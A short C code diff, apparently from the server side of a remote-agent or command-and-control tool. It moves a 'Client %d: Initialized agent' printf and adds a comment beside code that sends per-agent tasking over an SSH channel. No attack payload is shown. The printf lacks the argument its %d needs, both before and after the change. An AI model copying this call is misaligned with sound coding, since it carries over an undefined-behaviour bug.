@@ -375,12 +375,13 @@ void *ssh_handler(void* sess){
         
         if(!exists){
             init_agent(agent_id);
+            printf("Client %d: Initialized agent\n");
         }
-        printf("Client %d: Initialized agent\n");
+
         char tasking[2048];
         memset(tasking, 0, sizeof(tasking));
         get_tasking(agent_id, tasking);
-        
+        // Write tasking
         ssh_channel_write(pass.chan, tasking, strlen(tasking));
         
         // Pass to handler
